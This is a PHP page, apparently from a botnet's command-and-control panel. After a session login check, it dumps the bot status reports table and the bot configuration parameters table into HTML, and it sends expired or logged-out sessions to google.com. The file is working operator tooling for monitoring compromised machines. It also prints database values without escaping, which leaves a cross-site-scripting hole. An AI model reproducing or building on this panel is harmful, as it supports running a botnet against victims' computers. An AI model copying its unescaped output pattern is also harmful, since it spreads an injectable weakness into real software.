<?php
	header('Content-type: text/html');
	session_start();
	if(isset($_SESSION["LoggedIN"]) && $_SESSION["LoggedIN"]==true)
	{
		if(isset($_SESSION["sessionExpirationTime"]))
			if($_SESSION["sessionExpirationTime"]<time())					//if current time elapsed beyond expiration Time then destroy session
			{
				session_unset();
				session_destroy();
				header("Location: http://www.google.com");
			}else
			{
				$_SESSION["sessionExpirationTime"] = time()+240;			//extend session expiration time by 4 mins
				
				require 'db_conn.php';
				
				###################################################################################################
				
				echo "<html><head><title>Botnet Status Reports Table Dump</title><meta http-equiv=\"cache-control\" content=\"no-cache\"></head><body><table style=\"table-layout:fixed;width:100%;\" border=\"5\" bordercolor=\"#000000\" cellpadding=\"11\" cellspacing=\"11\">";
				
				$rs = $dbConn->query("show columns from bot_status_reports");
				if($rs)
				{
					echo '<tr>';
					while($row = $rs->fetch_assoc())
						echo '<th style="text-align:center;">'.$row["Field"].'</th>';
					echo '</tr>';
				}else
					echo "Server error occured";
						
				$rs = $dbConn->query("select * from bot_status_reports");
				if($rs)
				{
					while($row = $rs->fetch_assoc())
					{
						echo '<tr>';
						foreach ($row as $key => $value)
							if(preg_match('/.*TimeStamp$/', $key))			//if column name endsWith "TimeStamp"
								echo '<td style="text-align:center;">'.date('d-M(m)-Y D h:i:s A', strtotime($row[$key])).'</td>';
							else
								echo '<td style="text-align:center;">'.$row[$key].'</td>';
						echo '</tr>';
					}
				}else
					echo "Server error occured";
						
				echo '</table>';
				
				###################################################################################################
				
				echo '<br/><br/><table style=\"table-layout:fixed;\" border=\"5\" bordercolor=\"#000000\" cellpadding=\"11\" cellspacing=\"11\">';
				
				$rs = $dbConn->query("show columns from config_params");
				if($rs)
				{
					echo '<tr>';
					while($row = $rs->fetch_assoc())
						echo '<th style="text-align:center;width:400px;">'.$row["Field"].'</th>';
					echo '</tr>';
				}else
					echo "Server error occured";
				
				$rs = $dbConn->query("select * from config_params");
				if($rs)
				{
					while($row = $rs->fetch_assoc())
					{
						echo '<tr>';
						foreach ($row as $key => $value)
							echo '<td style="text-align:center;width:400px;">'.$row[$key].'</td>';
						echo '</tr>';
					}
				}else
					echo "Server error occured";
				echo '</table>';
				
				###################################################################################################
				
				$dbConn->close();
				echo '</body></html>';
				
				echo '<br /><br /><form name="LogoutForm" method="post" action="LogoutHandler.php"><input type="submit" value="Logout and Goto Google.com" /></form>';
			}
	}else
		echo 'You arent authorized to view this page!';
?>